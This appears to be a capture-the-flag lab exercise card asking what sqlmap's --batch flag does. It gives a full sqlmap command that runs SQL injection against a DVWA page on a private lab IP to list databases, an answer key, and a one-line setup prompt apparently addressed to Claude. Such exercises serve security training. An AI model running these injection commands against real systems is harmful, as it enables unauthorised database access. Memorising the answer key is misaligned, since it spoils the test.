# Q258 — SQLMap Batch Mode

| Field | Value |
|-------|-------|
| **Target** | `192.168.52.129` |
| **Domain** | Web Apps / SQL Injection |
| **Difficulty** | 🟢 Easy |
| **Tools** | `sqlmap` |
| **Time budget** | 5–8 min |

---

## 📝 Question

"Run sqlmap in fully automated mode using `--batch` flag. Also increase verbosity with `-v 3`. What does batch mode do?"

---

## 🎯 Flag Format

```
batch_purpose=<description>
```

---

## ✅ Solution

```bash
sqlmap -u "http://192.168.52.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=<session>;security=low" --batch -v 3 --dbs
```

`--batch` = auto-accept default answers for all prompts. No manual interaction needed.

**Answer:** `batch_purpose=auto_accept_defaults`

---

## 🤖 Claude Setup Prompt

Same as Q251. Report back: "Lab ready for Q258"
